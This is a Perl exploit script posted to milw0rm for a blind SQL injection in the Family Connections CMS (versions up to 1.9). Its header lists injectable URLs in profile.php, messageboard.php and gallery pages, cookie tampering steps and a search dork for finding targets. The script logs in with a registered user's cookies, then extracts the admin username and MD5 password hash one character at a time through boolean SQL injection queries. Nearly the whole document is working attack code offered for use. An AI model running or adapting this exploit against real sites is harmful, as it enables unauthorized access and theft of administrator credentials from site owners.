#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					¡PROUD TO BE SPANISH!				      **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#----------------------------------------------------------------------------------------------
#|       	   	   (GET var 'member') BLIND SQL INJECTION EXPLOIT  		      |
#|--------------------------------------------------------------------------------------------|
#|                           |      FAMILY CONNECTIONS <= v1.9     |		              |
#|  CMS INFORMATION:	      -------------------------------------	                      |
#|										              |
#|-->WEB: http://www.familycms.com/index.php		         	                      |
#|-->DOWNLOAD: http://www.familycms.com/download.php	          	                      |
#|-->DEMO: http://www.familycms.com/demo/index.php   	   				      |
#|-->CATEGORY: CMS/PORTAL								      |
#|-->DESCRIPTION: A private, easy-to-use website where you can connect  	 	      |
#|		with your friends and family. Share photos, messages, documents and more.     |
#|-->RELEASED: 2009-05-11								      |
#|											      |
#|  CMS VULNERABILITY:									      |
#|											      |
#|-->TESTED ON: firefox 3								      |
#|-->DORK: "2006-2009 Ryan Haudenschilt"				                      |
#|-->CATEGORY: BLIND SQL INJECTION EXPLOIT			                              |
#|-->AFFECT VERSION: <= 1.9				 			              |
#|-->Discovered Bug date: 2009-05-11							      |
#|-->Reported Bug date: 2009-05-11							      |
#|-->Fixed bug date: N/A								      |
#|-->Info patch (????): N/A					  			      |
#|-->Author: YEnH4ckEr									      |
#|-->mail: y3nh4ck3r[at]gmail[dot]com							      |
#|-->WEB/BLOG: N/A									      |
#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
#----------------------------------------------------------------------------------------------
#
#############
#-----------
#HISTORY:
#-----------
#############
#
#
#2008-06-14 --> http://www.milw0rm.com/exploits/5811 --> v1.4 --> Fixed
#
#2009-03-30 --> http://www.milw0rm.com/exploits/8319 --> v1.8.1 --> Not Fixed! (**)
#
#2009-04-03 --> http://www.milw0rm.com/exploits/8349 --> <=v1.8.2 --> Fixed
#
#2009-04-07 --> http://www.milw0rm.com/exploits/8361 --> <=v1.8.2 --> Not Fixed! (**)
#
#
#################################
#-------------------------------
#CURRENTLY:BLIND SQL INJECTION
#-------------------------------
#################################
#
#
#<<<<---------++++++++++++++ Condition: magic quotes=OFF/ON +++++++++++++++++--------->>>>
#
#<<<<-----------++++++++++++ Condition: Be register user  +++++++++++++----------->>>>
#
#
#=========
#---------
#COOKIES:
#---------
#=========
#
#
#fcms_login_uname=your_real_name
#
#fcms_login_pw=your_real_pass
#
#fcms_login_id=your_real_id+and+1=1
#
#
#(Delete PHPSESSID) Result: True --> Show page
#
#
#fcms_login_user=your_real_name
#
#fcms_login_pass=your_real_pass
#
#fcms_login_id=your_real_id+and+1=0
#
#
#(Delete PHPSESSID) Result: False --> Don't Show page
#
#
#Exploits --> (**)
#
#
#=====================================
#-------------------------------------
#(messageboard.php) GET var 'thread':
#-------------------------------------
#=====================================
#
#
#http://[HOST]/[PATH]/messageboard.php?thread=1+AND+1=1 --> TRUE
#
#http://[HOST]/[PATH]/messageboard.php?thread=1+AND+1=0 --> FALSE
#	
#
#================================
#--------------------------------
#(profile.php) GET var 'member':
#--------------------------------
#================================
#
#
#http://[HOST]/[PATH]/profile.php?member=2+AND+1=1 --> TRUE
#
#http://[HOST]/[PATH]/profile.php?member=2+AND+1=0 --> FALSE
#	
#
#===================================
#-----------------------------------
#(gallery/index.php) GET var 'pid':
#-----------------------------------
#===================================
#
#
#http://[HOST]/[PATH]/gallery/index.php?uid=2&cid=2&pid=1+and+1=1 --> TRUE
#
#http://[HOST]/[PATH]/gallery/index.php?uid=2&cid=2&pid=1+and+1=0 --> FALSE
#	
#
###########################
#--------------------------
#CONDITIONS TO EXPLOITING:
#--------------------------
###########################
#
#
#Valid username and password and id (Id is shown in cookies with autologin).
#
#
#######################################################################
#######################################################################
##*******************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
##     GREETZ TO: JosS, Ulises2k and all spanish Hack3Rs community!  ##
##*******************************************************************##
#######################################################################
#######################################################################
#
#
#-------------------EOF--INFO------------------------------->>>ENJOY IT!
#
#
use LWP::UserAgent;
use HTTP::Request;
use Digest::MD5 qw(md5_hex);
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = "";
	if (index(lc($SO),"win")!=-1){
		$linux="0";
	}else{
		$linux="1";
	}		
	if($linux){
		system("clear");
	}
	else{
		system("cls");
		system ("title Family Connections <= v1.9 (GET var 'member') BLIND SQL Injection Exploit");
		system ("color 02");
	}
}
sub request {
	my $userag = LWP::UserAgent->new;
	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	my $request = HTTP::Request -> new(GET => $_[0]);
	my $cookieid="fcms_login_id=".$_[1];
	my $cookieuname="fcms_login_uname=".$_[2];
	my $cookiepw="fcms_login_pw=".$_[3];
	my $cookie=$cookieid.";".$cookieuname.";".$cookiepw;
	$request->header(cookie => $cookie);
	my $outcode= $userag->request($request)->as_string;
	return $outcode;
	
}
sub helper {
	print "\n\t[!-!] Family Connections <= v1.9 (GET var 'member') BLIND SQLi Exploit\n";
	print "\t[!-!] USAGE MODE: [!-!]\n";
	print "\t[!-!] perl $0 [HOST] [PATH] [your-user] [your-pass] [your-id]\n";
	print "\t[!-!] [HOST]: Web.\n";
	print "\t[!-!] [PATH]: Home Path. Not use path= no-path\n";
	print "\t[!-!] [your-user]: Your username.\n";
	print "\t[!-!] [your-pass]: Your password.\n";
	print "\t[!-!] [your-id]: Id in cookies --> Name=fcms_login_id.\n";
	print "\t[!-!] Example: perl $0 'www.example.es' 'dogarchive' 'y3nh4ck3r' 'y3nh4ck3r' '123'\n"; 
}
sub error {
	print "\t-----------------------------------------------------------------\n";
	print "\tWEB IS NOT VULNERABLE!\n\n";
	print "\tMaybe --> \n\n";
	print "\t1.-Patched\n";
	print "\t2.-You aren't registered. Invalid username, password or id.\n\n";
	print "\tEXPLOIT FAILED!\n";
	print "\t-----------------------------------------------------------------\n";
}
sub testedblindsql {
	print "\t-----------------------------------------------------------------\n";
	print "\tWEB MAYBE BE VULNERABLE!\n\n";
	print "\tTested Blind SQL Injection.\n";		
	print "\tStarting exploit...\n"; 
	print "\t-----------------------------------------------------------------\n\n";
}
sub brute_length{
#User length
$exit=0;
$i=0;
while($exit==0){
	my $blindsql=$_[0]."+AND+(SELECT+length(username)+FROM+fcms_users+WHERE+id=1)=".$i++; #injected code
	$output=&request($blindsql,$_[1],$_[2],$_[3]);
	if($output =~ (/\<h3\>$_[2], $_[2]\<\/h3>/)){
		$exit=1;
	}else{
		$exit=0;
	}
	#Maybe patched. This is the max length of username
	if($i>25){
	&error;
	exit(1);
	}
}
#Save column length
$length=$i-1;
print "\t<<<<<--------------------------------------------------------->>>>>\n";
print "\tLength User catched!\n";
print "\tLength User: ".$length."\n";
print "\tBruteforcing User and Password values.\n";
print "\tWait several minutes (15 o 20 minutes)...\n";
print "\t<<<<<--------------------------------------------------------->>>>>\n\n";
return $length;
}
sub exploiting {
#Bruteforcing
$values="";
$k=1;
	$z=48;
	while(($k<=$_[1]) && ($z<=126)){
		my $blindsql=$_[0].'+AND+ascii(substring((SELECT+'.$_[2].'+FROM+fcms_users+WHERE+id=1),'.$k.',1))='.$z;
		$output=&request($blindsql,$_[3],$_[4],$_[5]);
		if ($output =~ (/\<h3\>$_[4], $_[4]\<\/h3>/))
		{
			$values=$values.chr($z);
			$k++;
			$z=47;
		}
#new char
	$z++; 
	}
return $values;
}
#Main
&lw;
	print "\t\t#########################################################\n\n";
	print "\t\t#########################################################\n\n";
	print "\t\t##   Family Connections <= v1.9 - BLIND SQLi Exploit   ##\n\n";
	print "\t\t##                  Author: Y3nh4ck3r                  ##\n\n";
	print "\t\t##         Contact:y3nh4ck3r[at]gmail[dot]com          ##\n\n";
	print "\t\t##                  Proud to be Spanish!               ##\n\n";
	print "\t\t#########################################################\n\n";
	print "\t\t#########################################################\n\n";
#Init variables
	my $host=$ARGV[0];
	my $path=$ARGV[1];
	my $myuser=$ARGV[2];
	my $mypass=md5_hex($ARGV[3]);
	my $myid=$ARGV[4];
#Build the uri
#Build the uri
	if($path eq "no-path"){
		$finalhost="http://".$host."/profile.php?member=".$myid;
	}else{
		$finalhost="http://".$host."/".$path."/profile.php?member=".$myid;
	}
#Check all variables needed
$numArgs = $#ARGV + 1;
	if($numArgs<=4) 
	{
		&helper;
		exit(1);	
	}
$finalrequest = $finalhost;	
#Testing blind sql injection
$blindsql=$finalrequest."+AND+1=1";
$output=&request($blindsql,$myid,$myuser,$mypass);
if ($output =~ (/\<h3\>($myuser, $myuser)\<\/h3>/))
{    
	#blind sql injection is available
	&testedblindsql;
}else{ 
	#Not injectable
	&error;
	exit(1); 
}
#Bruteforcing length
$length_user=&brute_length($finalrequest,$myid,$myuser,$mypass);	
#Bruteforcing username...
$username=&exploiting($finalrequest,$length_user,'username',$myid,$myuser,$mypass);
#Bruteforcing password...
$passhash=&exploiting($finalrequest,32,'password',$myid,$myuser,$mypass);
#final checking (perhaps admin id is not 2252)
if((!$username) || (!$passhash)){
	&error;
	exit(1);
}
print "\n\t\t*************************************************\n";
print "\t\t*********  EXPLOIT EXECUTED WITH SUCCESS ********\n";
print "\t\t*************************************************\n\n";
print "\t\tAdmin-username: ".$username."\n";
print "\t\tAdmin-password(md5 hash): ".$passhash."\n\n";
print "\n\t\t<<----------------------FINISH!-------------------->>\n\n";
print "\t\t<<---------------Thanks to: y3hn4ck3r-------------->>\n\n";
print "\t\t<<------------------------EOF---------------------->>\n\n";
exit(1);
#Ok...all job done

# milw0rm.com [2009-05-13]
